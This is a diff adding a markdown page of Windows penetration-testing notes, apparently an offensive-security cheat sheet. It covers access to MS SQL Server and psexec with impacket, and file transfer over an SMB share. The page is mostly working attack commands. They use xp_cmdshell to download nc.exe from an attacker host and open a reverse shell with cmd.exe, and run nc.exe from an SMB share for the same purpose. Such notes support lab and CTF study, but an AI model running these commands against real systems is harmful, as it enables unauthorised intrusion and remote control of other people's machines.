@@ -1,0 +1,54 @@
+# Windows Specific {-}
+
+## MS SQL Server {-}
+
+For accessing to **MS SQL SERVER**, you can use `mssqliclient.py` utility from the impacket package that is available on kali or that you
+can clone from the [impacket github repository](https://github.com/SecureAuthCorp/impacket).
+
+```bash
+locate mssqlcli
+python3 mssqlclient.py -windows-auth <user>:<password>@10.10.10.10
+SQL>
+```
+
+1. check if db user have sysadmin priviledges
+
+    ```bash
+    select IS_SRVROLEMEMBER('sysadmin', '<user>')
+    ```
+    if output is **1**, that means that the user is a priviledged user on the system
+
+2. execute commands
+
+    ```bash
+    EXEC xp_cmdshell 'echo %cd%'
+    xp_cmdshell powershell wget http://10.10.10.11:8000/nc.exe -OutFile %TEMP%\nc.exe
+    xp_cmdshell powershell "%TEMP%\nc.exe -nv 10.10.10.11 443 -e cmd.exe
+    ```
+
+## Connect to machine with PSEXEC {-}
+
+**psexec** is a tool from the impacket package. You can use it to connect to windows machines with a user and password.
+
+```bash
+python psexec.py <user>@10.10.10.10
+```
+
+## Send files to windows machine {-}
+
+### Share SMB directory to Windows Machine {-}
+
+Imaging we want to execute nc.exe on the Windows machine but this one don't have **nc.exe**. We can download nc.exe and execute
+it by sharing a SMB folder.
+
+1. On attacker machine
+
+    ```bash
+        impacket-smbserver smbFolder $(pwd) -smb2support
+    ```
+
+1. On windows machine
+
+    ```bash
+    \\10.10.10.10\smbFolder\nc.exe -e cmd 10.10.10.10 443
+    ```
